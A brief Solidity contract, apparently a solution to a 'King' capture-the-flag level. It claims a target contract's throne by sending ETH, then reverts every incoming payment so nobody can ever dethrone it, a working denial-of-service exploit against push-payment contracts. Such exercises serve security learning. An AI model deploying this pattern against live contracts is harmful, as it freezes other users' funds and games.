// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingHack {
    constructor() payable {}

    // Attack by sending ETH to King contract
    function attack(address kingContract) external payable {
        (bool s, ) = kingContract.call{value: msg.value}("");
        require(s, "Attack failed");
    }

    // When someone tries to dethrone us, revert
    receive() external payable {
        revert("I refuse to be dethroned");
    }
}

